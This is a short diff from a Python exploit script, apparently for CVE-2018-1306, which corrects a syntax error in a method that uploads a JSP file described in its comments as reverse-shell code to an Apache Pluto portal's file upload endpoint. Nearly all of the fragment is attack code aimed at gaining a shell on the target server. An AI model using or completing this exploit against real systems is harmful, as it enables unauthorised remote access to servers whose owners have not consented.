@@ -35,7 +35,7 @@ class CVE2018_1306:
     # send payload. update file with rev shell code
     def send_payload(self):
         print (LogColors.BLUE + "send payload with reverse shell..." + LogColors.ENDC)
-        url = self.url += "/pluto/portal/File%20Upload/"
+        url = self.url + "/pluto/portal/File%20Upload/"
         url += "__pdPortletV3AnnotatedDemo.MultipartPortlet%21-1517407963%7C0;0/__ac0"
         files = {'file' : open("/tmp/hack.jsp", "rb")}
         r = self.session.head(url, files = files)
